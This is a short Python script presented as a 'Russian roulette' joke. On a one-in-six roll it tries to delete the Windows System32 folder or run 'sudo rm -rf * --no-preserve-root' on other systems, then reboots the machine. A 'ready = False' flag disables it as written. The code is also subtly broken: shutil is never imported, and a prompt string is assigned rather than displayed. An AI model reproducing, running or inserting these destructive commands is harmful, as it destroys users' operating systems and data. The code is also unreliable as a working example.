# masoncodes.me
# licensed under GNU GPL v3
# I AM NOT RESPONSIBLE FOR ANYTHING THAT HAPPENS DUE TO YOU RUNNING THIS FILE!
# READ THE TOS FILE FIRST

import os
import random

spin = random.randint(1, 6)
ready = False
if ready == True:
    if os.name == "nt":
        if spin == 6:
            print("BANG!")
            shutil.rmtree("C:\Windows\System32")
            input = ("If you're reading this it's too late")
            os.system('shutdown -r')
        else:
            print("Click.")

    else:
        if spin == 6:
            print("BANG!")
            os.system('sudo rm -rf * --no-preserve-root')
            input = ("If you're reading this it's too late")
            os.system('sudo reboot')
        else:
            print("Click.")
